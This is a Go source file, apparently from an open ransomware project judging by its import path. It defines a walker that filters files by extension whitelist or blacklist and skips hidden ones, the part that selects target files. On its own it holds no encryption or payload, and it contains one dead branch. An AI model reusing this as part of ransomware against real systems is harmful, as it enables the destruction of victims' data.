package fs

import (
	iofs "io/fs"
	"path/filepath"

	"github.com/marmos91/ransomware/utils"
)

func WalkFilesWithExtFilter(path string, extBlacklist []string, extWhitelist []string, skipHidden bool, callback func(path string, info iofs.FileInfo) error) error {
	return filepath.Walk(path, func(currentPath string, currentInfo iofs.FileInfo, currentErr error) error {
		if currentErr != nil {
			return currentErr
		}

		isHidden, err := IsHidden(currentPath)

		if err != nil {
			return currentErr
		}

		if skipHidden && isHidden {
			return currentErr
		}

		if currentInfo.IsDir() {
			return currentErr
		}

		if len(extWhitelist) > 0 && whitelisted(currentPath, extWhitelist) {
			currentErr = callback(currentPath, currentInfo)
		} else if len(extBlacklist) > 0 && notBlacklisted(currentPath, extBlacklist) {
			currentErr = callback(currentPath, currentInfo)
		} else {
			if currentInfo.IsDir() {
				currentErr = callback(currentPath, currentInfo)
			}
		}

		return currentErr
	})
}

func whitelisted(path string, whitelist []string) bool {
	return utils.SliceContains(whitelist, filepath.Ext(path))
}

func notBlacklisted(path string, blacklist []string) bool {
	return !utils.SliceContains(blacklist, filepath.Ext(path))
}
